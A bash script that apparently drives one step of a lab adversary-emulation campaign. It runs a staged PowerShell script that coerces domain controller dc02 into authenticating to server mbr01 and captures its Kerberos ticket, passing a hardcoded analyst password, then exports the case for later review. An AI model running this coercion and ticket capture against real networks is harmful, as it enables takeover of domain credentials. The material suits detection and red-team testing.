#!/usr/bin/env bash
# T102 — Coerce dc02$ to auth to mbr01 + capture TGT
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T102-COERCE-DC02-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T102 | ${CASE_ID} | T0=${T0} ==="

campaign_stage_file campaign-a-t043-system-exec.ps1
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t102-coerce-dc02.ps1 child.cadre.local \
  "-Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools' -CaptureServer 'mbr01.child.cadre.local' -TargetDC 'dc02.child.cadre.local'")"
printf '%s\n' "${OUT}"
campaign_require_ok T102 "${OUT}" 'T102_OK'

cadre_export "${CASE_ID}" T102 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T102 complete ==="
